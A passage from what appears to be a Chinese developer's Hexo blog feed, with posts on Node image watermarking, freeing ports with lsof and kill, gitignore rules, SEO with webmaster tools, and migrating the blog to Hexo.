class="selector-tag">echo</span> <span class="selector-tag">CSSCode</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果发现 cookie 中的版本号与设定的版本号不一样，或者没有 cssV cookie，则同步内联输出 css 和 js。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文只是对京东首页用到的部分技术做一个简要的分析，页面加载速度确实十分可观，赞！</p><p>随着需求的多元化和终端设备的多元化，前端技术在 web 舞台上一直展现着优美的身姿，她在进化、在演变，几乎每隔一两个月就能听到新的前端技术出来，所以学是学不过来的，前端的学习就两个字：”理解为什么”。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 京东 </tag>
            
            <tag> 技术架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs给图片批量加水印</title>
      <link href="/blog/2015/09/08/add-watermark-to-images/"/>
      <url>/blog/2015/09/08/add-watermark-to-images/</url>
      
        <content type="html"><![CDATA[<p>本只是想给博客添加个水印，github 上搜索了半天，找了一个比较小巧的库，叫做 images。</p><span id="more"></span><p>这个库的地址是：<a href="http://github.com/zhangyuanwei/node-images">http://github.com/zhangyuanwei/node-images</a>，它是一个跨平台极为轻量的图片编解码工具，同时附加了一些图片的操作函数，如：</p><ul><li><code>.size()</code> 比例伸缩</li><li><code>.draw(img, x, y)</code> 在图片上绘制一个图片</li><li><code>.encode()</code> 将图片解码到 buffer 中</li></ul><p>给图片加水印主要就用到了 <code>.draw()</code> 函数。</p><p>首先需要安装 <code>images</code> 库：</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> images</span><br></pre></td></tr></table></figure><p>然后开撸，基本代码如下:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> images = <span class="built_in">require</span>(<span class="string">&#x27;images&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> watermarkImg = <span class="title function_">images</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;path/to/watermark.ext&#x27;</span>));</span><br><span class="line"><span class="keyword">var</span> sourceImg = <span class="title function_">images</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;path/to/sourceImg.ext&#x27;</span>));</span><br><span class="line"><span class="keyword">var</span> savePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;path/to/saveImg.jpg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 比如放置在右下角，先获取原图的尺寸和水印图片尺寸</span></span><br><span class="line"><span class="keyword">var</span> sWidth = sourceImg.<span class="title function_">width</span>();</span><br><span class="line"><span class="keyword">var</span> sHeight = sourceImg.<span class="title function_">height</span>();</span><br><span class="line"><span class="keyword">var</span> wmWidth = watermarkImg.<span class="title function_">width</span>();</span><br><span class="line"><span class="keyword">var</span> wmWidth = watermarkImg.<span class="title function_">height</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">images</span>(sourceImg)</span><br><span class="line">  <span class="comment">// 设置绘制的坐标位置，右下角距离 10px</span></span><br><span class="line">  .<span class="title function_">draw</span>(watermarkImg, sWidth - wmWidth - <span class="number">10</span>, sHeight - wmHeight - <span class="number">10</span>)</span><br><span class="line">  <span class="comment">// 保存格式会自动识别</span></span><br><span class="line">  .<span class="title function_">save</span>(savePath);</span><br></pre></td></tr></table></figure><p>晒一张本博客的一个水印截图：</p><p><img src="/../blogimgs/2015/09/08/201592102.jpg" alt="博客水印截图"></p><p>看到右下角的水印了么 ；）</p><p>至于批量加水印，额，for 循环吧，while 循环也行&#x3D;。 &#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 网络技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> npm </tag>
            
            <tag> 水印 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unix下的文件操纵</title>
      <link href="/blog/2015/09/07/lsof-in-xnix/"/>
      <url>/blog/2015/09/07/lsof-in-xnix/</url>
      
        <content type="html"><![CDATA[<p>unix&#x2F;linux 下的命令太多了，花时间系统去学肯定十分枯燥，平时有需求用到某些命令的时候就会将这个命令所有的功能都看看，这次是为了关掉某个端口的进程，学习了下 lsof 和 kill 命令。</p><span id="more"></span><p>在 sublime 中配置了开启 node 的快捷方式，<code>Command + B</code> 可以直接执行正在编辑的 js 文件。多次由于操作不当，报错：</p><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error: </span>listen EADDRINUSE</span><br><span class="line">    at exports._errnoException (util.js:746:11)</span><br><span class="line">    at Server._listen2 (net.js:1156:14)</span><br><span class="line">    at listen (net.js:1182:10)</span><br><span class="line">    at Server.listen (net.js:1267:5)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>意思就是端口被占用 <code>EADDRINUSE</code>，即 “Error: Address in use”，这里为啥唤作 address 而不是 port 被占用，还是有说法的。</p><p>在 linux&#x2F;unix 下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。如 TCP&#x2F;UDP 套接字，应用程序都会在系统目录下为期分配一个文件描述符，这个描述符就是程序和系统交互的接口。</p><h3 id="lsof-命令"><a href="#lsof-命令" class="headerlink" title="lsof 命令"></a>lsof 命令</h3><p><code>lsof</code> 是 *nix 下常用的一个命令，全称为 “list open file”，列举被打开的文件描述符的相关信息，包括：</p><ul><li><code>-u</code> 用户，如 root</li><li><code>-c</code> 进程名，如 chrome</li><li><code>-g</code> gid</li><li><code>-p</code> pid</li><li><code>-a</code> and 的意思，满足多个条件过滤</li><li><code>-i</code> 端口号</li></ul><p>还有几个就不列举了，对一般用户来说并不常用。一次命令的执行，程序会吐出这些信息：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">➜  blogsys ✗ lsof -i :<span class="number">4001</span></span><br><span class="line">COMMAND     PID      <span class="keyword">USER</span>   <span class="title">FD</span>   <span class="keyword">TYPE</span> <span class="keyword">NODE</span> <span class="title">NAME</span></span><br><span class="line">Google    <span class="number">57881</span> barretlee  <span class="number">113</span>u  IPv4 TCP localhost:<span class="number">52445</span>-&gt;localhost:newoak (ESTABLISHED)</span><br><span class="line"><span class="keyword">node</span>      <span class="title">68004</span> barretlee   <span class="number">11</span>u  IPv6 TCP *:newoak (LISTEN)</span><br><span class="line"><span class="keyword">node</span>      <span class="title">68004</span> barretlee   <span class="number">18</span>u  IPv6 TCP localhost:newoak-&gt;localhost:<span class="number">52445</span> (ESTABLISHED)</span><br></pre></td></tr></table></figure><p>中间还有一个 DEVICE 和 SIZE，被我删掉了。从上面可以看到包含如下信息：</p><ul><li>COMMAND 对应我们上面提到的 -c</li><li>PID     对应 -p</li><li>USER    对应 -u</li><li>NAME    被打开文件的名字</li><li>FD、TYPE、NODE 就不细说了，可以看下面两篇参考文章</li></ul><p>通过前面的参数，可以筛选被打开的文件。</p><h3 id="关闭开启的端口"><a href="#关闭开启的端口" class="headerlink" title="关闭开启的端口"></a>关闭开启的端口</h3><p>通过 lsof 的端口查找参数找到 pid 或者 command：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i :4001</span><br></pre></td></tr></table></figure><p>比如我们找到的 command 是 node， pid 为 73220，则可以通过下面的方式关闭端口：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">kill -p <span class="number">73220</span></span><br><span class="line">pkill <span class="keyword">node</span><span class="title"></span></span><br></pre></td></tr></table></figure><p>另外还有 killall、xkill 等命令，可以阅读 <a href="http://www.thegeekstuff.com/2009/12/4-ways-to-kill-a-process-kill-killall-pkill-xkill/">4 Ways to Kill a Process – kill, killall, pkill, xkil</a></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="http://blog.csdn.net/guoguo1980/article/details/2324454">linux lsof详解</a></li><li><a href="http://blog.csdn.net/jkh753/article/details/10060423">linux 系统监控、诊断工具之 lsof 用法简介</a></li><li><a href="http://www.thegeekstuff.com/2009/12/4-ways-to-kill-a-process-kill-killall-pkill-xkill/">4 Ways to Kill a Process – kill, killall, pkill, xkil</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lsof </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用对 gitignore</title>
      <link href="/blog/2015/09/06/set-gitignore-after-add-file/"/>
      <url>/blog/2015/09/06/set-gitignore-after-add-file/</url>
      
        <content type="html"><![CDATA[<p>使用 git 做代码管理工具时，设置 gitignore 是必不可少的流程，一些系统或者 IDE 会在目录下生成与项目不相关的文件，而这些文件我们不期望被提交到仓库之中。理解 gitignore 的 pattern 规则十分重要。</p><span id="more"></span><h3 id="Pattern-规则"><a href="#Pattern-规则" class="headerlink" title="Pattern 规则"></a>Pattern 规则</h3><p>关于 Pattern 规则，可以查看 git 的相关文档：<a href="http://git-scm.com/docs/gitignore">http://git-scm.com/docs/gitignore</a>，大致有以下几点：</p><ol><li>空行不匹配任何内容，所以可以作为块分隔符；</li><li><code>#</code> 开头表示注释，如果相匹配 <code>#</code>，可以在前面加一个反斜杠，即 <code>\#</code>；</li><li>除非加了反斜杠，否则一连串的空格会被忽略；</li><li>如果在匹配的内容前面加上 <code>!</code>，则这些匹配过的部分将被移出，如果要匹配以 <code>!</code> 开头的内容，需要加上反斜杠，如 <code>\!important.txt</code>；</li><li>如果一个匹配 pattern 后面有一个斜杠，如 <code>foo/</code>，则默认会匹配所有（包含父子文件夹）中的 foo 文件夹内容，并且它不会匹配单个的文件；</li><li>如果一个匹配 pattern 不包含斜杠，如 <code>foo</code>，Git 会将其作为一个 shell 的查找命令匹配内容。</li></ol><p>需要注意的 <code>**</code>：</p><ul><li>如果一个 pattern 以 <code>**</code> 开头，如 <code>**/foo</code>，最后会匹配所有文件夹下的 foo 文件(夹)；</li><li>如果一个 pattern 以 <code>/**</code> 开头，如 <code>abc/**</code>，则表示匹配 abc 目录下的所有内容；</li><li>如果一个 pattern 中间包含 <code>**</code>，如 <code>a/**/b</code>，则会匹配 <code>a/b</code>、<code>a/x/b</code>、<code>a/x/y/b</code> 以及所有类似的内容。</li></ul><h3 id="gitignore-相关的问题"><a href="#gitignore-相关的问题" class="headerlink" title="gitignore 相关的问题"></a>gitignore 相关的问题</h3><h4 id="匹配示例"><a href="#匹配示例" class="headerlink" title="匹配示例"></a>匹配示例</h4><p>如果我们要匹配 ‘foo’ 目录下除去 ‘foo&#x2F;bar&#x2F;‘ 的内容，可以这样做：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">foo/</span><br><span class="line">!foo<span class="regexp">/bar/</span></span><br></pre></td></tr></table></figure><p>如果要匹配所有目录下的 node_modules 文件夹，只需要这样做：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">node_modules/</span><br></pre></td></tr></table></figure><p>如果要匹配所有的 json 文件，可以这样做：</p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="comment">*.json</span></span><br></pre></td></tr></table></figure><h4 id="git-操作中，add-之后再加入-gitignore"><a href="#git-操作中，add-之后再加入-gitignore" class="headerlink" title="git 操作中，add 之后再加入 gitignore"></a>git 操作中，add 之后再加入 gitignore</h4><p>Git 操作中经常会出现这样的问题，当我们 <code>git add</code> 之后，突然想起来要添加一个 gitignore 文件，但是一些诸如 node_modules&#x2F;, cache&#x2F; 等文件已经被 add 进去了，这些文件不会被 ignore 掉，怎么办？</p><p>最直接的方式是：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这一步的操作相当于回到 git add 上一步</span></span><br><span class="line">git <span class="built_in">rm</span> -r --cached .</span><br><span class="line"><span class="comment"># 然后重新 add</span></span><br><span class="line">git add --all .</span><br></pre></td></tr></table></figure><h4 id="git-添加空文件夹"><a href="#git-添加空文件夹" class="headerlink" title="git 添加空文件夹"></a>git 添加空文件夹</h4><p>Git 默认是不添加空文件夹的，如果一定要加入这个文件夹，有以下方案：</p><p>1）在文件夹添加文件，然后删除</p><p>2）在文件夹中添加一个 <code>.gitkeep</code> 文件</p><h4 id="让-git-不要添加-gitignore-文件"><a href="#让-git-不要添加-gitignore-文件" class="headerlink" title="让 git 不要添加 gitignore 文件"></a>让 git 不要添加 gitignore 文件</h4><p>如果在 .gitignore 文件中添加</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="title">.gitignore</span></span><br></pre></td></tr></table></figure><p>你会发现，并没有起作用， .gitignore 文件依然被加到了 git 中，为什么会有这个需求呢？有些人在本地开发的时候有一些其他的文件夹名不愿意让别人看到，虽然在 gitignore 中被忽略了，但是 .gitignore 文件中依然可以看到这些文件夹名字。</p><p>其实没有什么好的办法处理这个问题，.gitignore 做多人协作开发的时候可以直接根据同一份 gitignore 过滤文件，如果一定要做，可以从 add 中在 remove 掉：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">git rm <span class="params">--cached</span> <span class="string">.gitignore</span></span><br></pre></td></tr></table></figure><p>Git 操作涉及的命令巨多，但是日常开发中用到的就那么几个，把原理搞清楚，用起来得心应手。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> gitignore </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站的SEO以及它和站长工具的之间秘密</title>
      <link href="/blog/2015/09/02/webmaster-in-baidu-and-google/"/>
      <url>/blog/2015/09/02/webmaster-in-baidu-and-google/</url>
      
        <content type="html"><![CDATA[<p>博客迁移没有注意 URL 地址的变化，导致百度和 google 这两只爬虫引擎短时间内找不到路。近段时间研究了下国内最大搜索引擎百度和国际最大搜索引擎google的站长工具，说下感受。</p><ul><li>百度的站长工具地址：<a href="http://zhanzhang.baidu.com/dashboard/index">http://zhanzhang.baidu.com/dashboard/index</a></li><li>google 的站长工具地址: <a href="http://www.google.com/webmasters/tools/home">http://www.google.com/webmasters/tools/home</a></li></ul><p>最近墙的比较厉害，google 不一定能访问进去（我平时用的 <a href="http://gjsq.link/">GreenVPN</a>，还挺不错的，速度快，支持的国家也多）。</p><p>站长工具的作用是为了辅助开发者，针对自己的网站做出更加合理的网页布局和代码优化，以便让 spider 更好地理解网页，从而将最准确的信息送达到用户的荧屏上。它对搜索引擎和开发者是双赢的。</p><p>Web 发展极快，由于客户端厂商纷纭加之开发者没把重点放在 web 标准上，直到 2014 年的 10 月底才有了<a href="http://www.w3.org/TR/2014/REC-html5-20141028/">统一的标准</a>。用户输入关键词，搜索引擎要在 0.1s 内将网络上的资源汇聚起来，这个过程中计算的开销、数据整合的开销是极大的，如果我们开发的网页不能让 spider 准确理解，最后的结果就是，写的东西很难出现在用户面前。</p><h3 id="搜索引擎对网页的理解"><a href="#搜索引擎对网页的理解" class="headerlink" title="搜索引擎对网页的理解"></a>搜索引擎对网页的理解</h3><p>摸索两个站长工具，感触最深的是结构化数据(Structured Data)，结构化数据不是把文章段落分清楚、标题写清楚，实际上你文章段落分的再清晰，爬虫机器也不知道你在表达什么，所以数据结构化是给爬虫看而不是给人看的。HTML 标签的数量很有限，有限的几个标签没办法表达网页上每一个元素的含义，比如一个小的图标、一个广告位、一个蒙层等，于是网页上出现了很多 class 名、id 名来标记一个元素。这些内容的统一让爬虫理解的略微透彻了一些，比如:</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="title">.banner: 一张banner广告位</span></span><br><span class="line"><span class="title">.sidebar: 侧边导航栏</span></span><br><span class="line"><span class="title">.nav: 主导航</span></span><br><span class="line"><span class="title">.icon: 页面小图标</span></span><br><span class="line"><span class="title">.post: 一篇文章</span></span><br><span class="line"><span class="title">.post-title: 文章标题</span></span><br></pre></td></tr></table></figure><p>然而搜索引擎聚合的网页太多，当这些五花八门的 class 出来之后，它又开始迷茫了，难以较好的聚合分类。所以出现一个叫做 Schema 的东西，它用来表示一个结构化数据结构，可以看下面一个 schema 示例：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">itemscope</span> <span class="attr">itemtype</span>=<span class="string">&quot;http://schema.org/Person&quot;</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;name&quot;</span>&gt;</span>李靖<span class="tag">&lt;/<span class="name">span</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://barretlee.com/avatar.png&quot;</span> <span class="attr">itemprop</span>=<span class="string">&quot;image&quot;</span> /&gt;</span>    </span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;jobTitle&quot;</span>&gt;</span>攻城师<span class="tag">&lt;/<span class="name">span</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">itemprop</span>=<span class="string">&quot;address&quot;</span> <span class="attr">itemscope</span> <span class="attr">itemtype</span>=<span class="string">&quot;http://schema.org/PostalAddress&quot;</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;streetAddress&quot;</span>&gt;</span>文一西路969号<span class="tag">&lt;/<span class="name">span</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;addressLocality&quot;</span>&gt;</span>浙江杭州<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;postalCode&quot;</span>&gt;</span>310000<span class="tag">&lt;/<span class="name">span</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;telephone&quot;</span>&gt;</span>(0571) 123-4567<span class="tag">&lt;/<span class="name">span</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:barret.china@gmail.com&quot;</span> <span class="attr">itemprop</span>=<span class="string">&quot;email&quot;</span>&gt;</span>barret.china@gmail.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  李靖的主页:  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://barretlee.com&quot;</span> <span class="attr">itemprop</span>=<span class="string">&quot;url&quot;</span>&gt;</span>barretlee.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>在一个需要表达的块上加上 <code>itemscope</code> 属性和一个 <code>itemtype</code> 属性，itemtype 是有固定值的，具体可以参阅 <a href="http://schema.org/">schema.org</a> 的说明。然后在块内添加详细的说明，使用 <code>itemprop</code> 标注。整个操作十分简单，略微麻烦的是需要对照 schema 的官方网站填写规定的 <code>itemprop</code> 字段。</p><p>结构化数据，通常也可以称之为元数据，这些数据附着在网页文本信息内，厘清了页面上每个部件的功能、属性和意义。当机器进入网页的时候，能够像人一样，一眼瞄出要表达的内容。关于 schema ，以前翻译过一篇文章 <a href="https://www.barretlee.com/blog/2013/11/01/cb-let-your-page-understood-by-search-engine/">SEO：让搜索引擎对你的网站更有亲和力</a>。</p><h3 id="SEO和站长工具的之间秘密"><a href="#SEO和站长工具的之间秘密" class="headerlink" title="SEO和站长工具的之间秘密"></a>SEO和站长工具的之间秘密</h3><p>除非搜索引擎能够猜到你要搜索的具体的 URL 地址，一般地，它都会从自己的数据索引库中扒拉数据。对于权重高、更新频率高、原创内容多的网站，搜索引擎会十分勤快的爬最新内容。那么，如何让搜索引擎知道网站上有多少网页便成了一件重要的事情。</p><p>我们经常会听到一个叫做”网站地图”的东西。有些网站会在自己的站点中添加一个页面，这个页面包括了整站的重要入口，那么这个页面就是该页面的网站地图。这些地图是给人看的，如果只想给爬虫引擎看，可以将所有的链接按照一定的格式放到 <code>sitemap.xml</code> 文件中，然后把这个文件放到网站的根目录下，如 <a href="https://www.barretlee.com/sitemap.xml">https://www.barretlee.com/sitemap.xml</a>。</p><p>而最重要的还是 <code>robots.txt</code> 这个文件，它是所有引擎约定俗成的一个文件，比如我的网站中用到的 <a href="https://www.barretlee.com/robots.txt">https://www.barretlee.com/robots.txt</a> ，其内容为：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Sitemap: https://www.barretlee.com/sitemap.xml</span><br><span class="line">User-agent: *</span><br><span class="line">Allow: /</span><br></pre></td></tr></table></figure><p>它告诉搜索引擎，网站地址的位置、允许蜘蛛爬取的内容等，它是一个协议。最近，貌似还多了一个 <code>humans.txt</code>，也是一个比较有意思的文件，可以在这里了解它：<a href="http://www.humanstxt.org.cn/">http://www.humanstxt.org.cn/</a>，它可以描述一些站点和团队的故事。</p><p>SEO上，站长工具主要分为两个方面，一个是对网页的抓取，一个是对网页的分析。</p><p>网页的抓取在百度站长工具中体现的比较多，而网页的分析，诸如数据标注、结构化数据等，百度做的还比较搓，目前还在内测阶段，需要发送邮件才能申请权限。看到百度站长工具页面上的几个数据标注示意图，揣测应该比 google 弱一百倍，所以我还是重点说说 google 的吧。</p><h4 id="网页的抓取"><a href="#网页的抓取" class="headerlink" title="网页的抓取"></a>网页的抓取</h4><p>这块上，两个站长工具都是强调让开发者把网站地图显式的暴露给搜索引擎，提供了各种分析网站地图准确性合理性的工具，搜索引擎如果发现你的网站上一个地址时有时无，就会觉得你不可信有点飘渺。所以一旦网页因为改造或迁移导致页面链接丢失，可以在站长工具中填写这些死链。</p><p>不要贪婪的让搜索引擎不停的爬取你的网站，如果它多次过来发现内容是一样的，它也会很伤心的离开。而如果它发现每次过来爬你的内容都能找到很有意思的、从来没发现过的东西，它会对你越来越感兴趣，甚至日久天长它会给你定型、定位，然后权重会越来越高。在站长工具上都是可以设置的。</p><h4 id="网页的分析"><a href="#网页的分析" class="headerlink" title="网页的分析"></a>网页的分析</h4><p>google 的数据化标记做的实在是太赞了！输入网址，它会打开你的网页，设置你要标记的类型，比如文章。选中页面上的元素然后标记。比如选中文章的标题，选中之后有一个菜单，在菜单上选择 title，选中作者名字，然后菜单上选择 author，一个页面标记完了之后，他会分析整站的所有页面，如果结构相似，也会自动标记其他页面。</p><p>整个标记完成之后，google 就知道你整个网站的信息架构了，下次要做的就是对这些信息内容做匹配和分类。所以我们可以看到，个人博客在 google 中的搜索是极其靠前的，因为页面的信息结构简单，即便你不去标记，它爬取多次之后也能自己理解。</p><p>对比百度和 google ，两者如同屌丝和高富帅。不过高富帅总是要越墙才能看到，所以我平时使用的依然是百度分析。百度分析和百度站长工具还是不一样的。百度对网页流量的分析和搜索词汇的分析还是挺精准，也很有参考价值。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文对 SEO 相关的东西做了一个简要的概述，同时也概括了搜索引擎做的一些工作，知识量有限，难以面面俱到，如有错误还请斧正。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> SEO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>按照这样的流程玩博客，最后都到了这里</title>
      <link href="/blog/2015/08/31/migrate-blog-to-hexo/"/>
      <url>/blog/2015/08/31/migrate-blog-to-hexo/</url>
      
        <content type="html"><![CDATA[<p>前几天看到 <a href="http://www.nczonline.net/blog/2015/08/wordpress-jekyll-my-new-blog-setup/">Nicholas C.Zakas</a> 大师把自己的博客从 wordpress 迁移到了 jekyll，很巧的是我这几天也在干这件事情。不过我是迁移到 hexo，刚开始托管在 github，后来改到 <a href="http://gitcafe.com/signup?invited_by=barretlee">gitcafe</a>。</p><p>之前我捯饬过很多博客系统，也喜欢了解各个博客系统的实现方式，并且自己写插件、写主题。由于最开始接触的一门 web 后端语言是 php，所以先折腾小而美的 wordpress，后来发现它并不小，一堆插件、一堆漏洞让这个系统变得臃肿，而翻开这些插件的源码，实在是不怎么样，系统的性能很大程度是被这些插件搞糟糕的。不过，让我放下 wordpress 的主要原因不是它的臃肿…我玩它的时候还是个学生，不想花钱购买空间和数据库，当时百度云还没有出来，<a href="http://www.sinnapp.com/">SAE</a> 的体验也比较差。</p><h3 id="到”这里”之前"><a href="#到”这里”之前" class="headerlink" title="到”这里”之前"></a>到”这里”之前</h3><p>后来学会了使用 git，刚开始对 git 命令并不熟悉，记得在 github 上弄一个 <code>ssh key</code> 折腾了良久，最后不得不安装一个 windows 版本的 github 客户端，让客户端解决我 push 代码的难题。按照阮一峰写的一篇 <a href="http://www.ruanyifeng.com/blog/2012/08/blogging_with_jekyll.html">关于如何使用 github pages</a> 的文章，部署了一个<a href="http://barretlee.github.io/">博客</a>。</p><p>当我把 jekyll 的文档看完了之后（刚搜到有<a href="http://jekyll.bootcss.com/">中文版</a>的了，这年代啥玩意儿都有中文版…），又搞了一个清爽版本的<a href="http://hi.barretlee.com/">博客</a>，这个博客上我做了一个很方便连接，在页面中按下 <code>Ctrl + Shift + Enter</code> 或者在网址后面加上 <code>?edit</code> 可以看到，每篇文章都有一个对应到这篇文章的 github 编辑地址，这样就可以完全放下本地工具，直接云端操作了。</p><p>Github Pages 玩熟之后，下一步要做的就是，抛弃它——程序员爱折腾。当然我并没有完全抛弃，<a href="http://hi.barretlee.com/">http://hi.barretlee.com</a> 这个网站也时有上去更新。不过现在它的内容已经被合并到本网站下了，后续便不会再光顾。Github Pages 上每次都要维护点、修改点内容，从本地到 github 再到我的网页上，整个流程显得有点长，太麻烦。</p><p>后来索性就入驻了博客平台，<a href="http://hustskyking.cnblogs.com/">博客园</a>，这一入就是两年多。博客园团队把写作体验和分享内容做到了极致，百度上随便搜一个技术性相关的知识点，都能看到博客园的身影。虽然 SEO 会把年老页面的权重提升，但是没有创新内容网站是活不下去的，我也在博客园平台上写了不少的文章，没想到的是也引来了一千多的粉丝。</p><h3 id="还是买主机吧"><a href="#还是买主机吧" class="headerlink" title="还是买主机吧"></a>还是买主机吧</h3><p>一直想有一个个人网站，所有的内容都是自己支配，增加一个个性页面、博客后台换个语言、用用 websocket 等等，于是毕业之后自己买了一个主机，肆意倒腾。在主机上，重新回顾了 Linux 的操作（大学使用 windows&#x2F;Linux），学习了 Nginx 的配置、Apache 的配置、负载均衡等等，也使用 NodeJS 搞了一个 websocket 的聊天室，当然，也少不了搭建一个博客系统。使用的是 <a href="http://www.ghostchina.com/">Ghost</a>，一个相当不错的博客平台，我非常喜欢它后台编辑博客的系统，支持 Markdown 并且很好的处理了图片的上传，体验很赞！同时也部署了一个 hexo 写写生活琐事，用的是官方一个比较简约的主题。感觉也一直挺好的。</p><p>可以一年下来，又到了续费的时间了。可是回头想想，我用这些资源都干了什么事情呢？除了刚买主机那会儿兴奋了一阵子，后边大半年都没上过那台机器。着实太浪费了！每年上千块（我买的是很低的配置），就是放几个很少更新的博客文章，所以再也没啥续费的动力了。</p><p>期间也用了 SAE 和 BAE，SAE 使用的云豆，买点云豆如果网站没啥流量，十块钱够用一两年。而 BAE 略坑一点，它计算的是你占用的服务器资源，根据一定的算法每个月将账单发到你的手机和邮箱，让你交钱，如果流量不大，每个月也就几十块，可以设置自动续费。不过，想想，其实 BAE 也挺坑的，一年下来收我几百块，虽然不多，但想着还是觉得没多大劲。</p><h3 id="我又放弃了"><a href="#我又放弃了" class="headerlink" title="我又放弃了"></a>我又放弃了</h3><p>于是我又开始了下一波的折腾。趁着阿里云主机到期之前的半个月，把散布在各处的博客整合下。也就是您现在看到的这个博客内容。简约、明了，风格上学习了简书的布局、设计上参考了阮一峰同学的博客。包括整合各处博客，格式化博客内容，编写主题，调试页面等，花了整整三天时间，够呛的！不过，按照之前玩转博客的时间情况，可以确定，这个设计和博客的部署至少会伴随我五到十年。</p><p>刚开始我把这个基于 <a href="http://hexo.io/">hexo</a> 构建的博客部署在 <a href="//github.com/barretlee/blog">github</a> 上，我在家里打开速度还过得去，2-3s，但是放到群里，让朋友们测试了下，有的喊出了 20s 的加载时间，这着实让我大吃一惊，果然 github 这种外国货还是不适合我们，于是在 <a href="http://annn.me/">阿安</a> 的建议下，又将部署地址换到了 <a href="//help.gitcafe.com/manuals/help/pages-services">gitcafe</a>。为了方便让 github 的用户顺利迁移到 gitcafe，gitcafe 的几乎就是一个 github 的复制品，包括创建 gitcafe pages，在仓库中弄一个 <code>gitcafe-pages</code> 的分支就行了。不过，说句良心话，gitcafe 的体验略好；）</p><h3 id="静态博客，找地方托管"><a href="#静态博客，找地方托管" class="headerlink" title="静态博客，找地方托管"></a>静态博客，找地方托管</h3><p>我想，找个地方托管静态博客，这将是我们博客最终的归属。阮一峰说写博客的人会经历三个阶段：</p><ul><li>第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。</li><li>第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。</li><li>第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。</li></ul><p>其实 <a href="http://www.cnblogs.com/">博客园</a> 就是第三阶段的实践平台，博客园中我看到了很多不错的博客版式设计，让人吃惊的是，这些版式的设计几乎没有任何限制，你完全可以天花乱坠的按照自己的风格搞设计，但前提你要懂点设计和 